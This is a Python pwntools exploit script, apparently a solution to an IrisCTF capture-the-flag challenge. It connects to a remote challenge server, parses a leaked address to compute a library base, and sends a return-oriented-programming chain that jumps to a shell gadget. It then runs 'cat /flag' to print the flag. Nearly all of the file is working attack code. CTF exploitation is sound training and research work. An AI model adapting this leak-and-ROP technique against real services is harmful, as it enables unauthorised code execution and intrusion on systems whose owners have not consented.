#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

from pwn import *
r = pwnlib.tubes.remote.remote('a.chal.irisc.tf', 10001)
print(r.recvuntil(b'== proof-of-work: '))
#if r.recvline().startswith(b'enabled'):
#    handle_pow(r)
r.send(input("pow: "))

leak = r.recvuntil(b"\nHow").decode().split("\n")[-2].split(" ")[-1]
leak = eval(leak) - 0x31cf0
print(hex(leak))

def p64(i):
    return i.to_bytes(8, byteorder="little")

ADDRAXRDXJUMPRAX = 0x000000000000f39f + leak
POPRAX_RET = 0x000000000001a3c8 + leak
OFFSET = 0x4f2a5 - 0x3ed8c0
OFFSET = OFFSET & (2**64 - 1)

rop = b"aaaabbbbccccdddd"
rop += p64(POPRAX_RET)
rop += p64(OFFSET)
rop += p64(ADDRAXRDXJUMPRAX)

r.sendline(rop)
r.sendline(b"cat /flag")

print(r.recvuntil(b'irisctf{'))
print(r.recvuntil(b'}'))

exit(0)
